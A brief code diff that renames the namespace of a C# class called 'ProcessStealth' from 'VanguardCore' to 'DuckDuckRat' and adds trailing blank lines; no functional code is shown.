@@ -4,7 +4,7 @@ using System.Diagnostics;
 using System.Text;
 using Microsoft.Win32.SafeHandles;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class ProcessStealth
     {
@@ -209,3 +209,5 @@ namespace VanguardCore
         }
     }
 }
+
+
